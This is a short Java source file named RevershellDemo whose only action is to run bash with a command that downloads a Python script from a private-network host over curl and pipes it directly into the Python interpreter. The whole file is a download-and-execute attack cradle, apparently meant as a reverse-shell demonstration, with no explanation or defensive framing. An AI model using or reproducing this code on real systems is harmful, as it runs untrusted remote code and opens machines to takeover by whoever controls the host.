import java.io.IOException;

public class RevershellDemo {

    public static void main(String[] args) {
        try {
            String[] cmd = {"/bin/bash", "-c", "curl 192.168.3.2:8384/note.py |python -"};
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
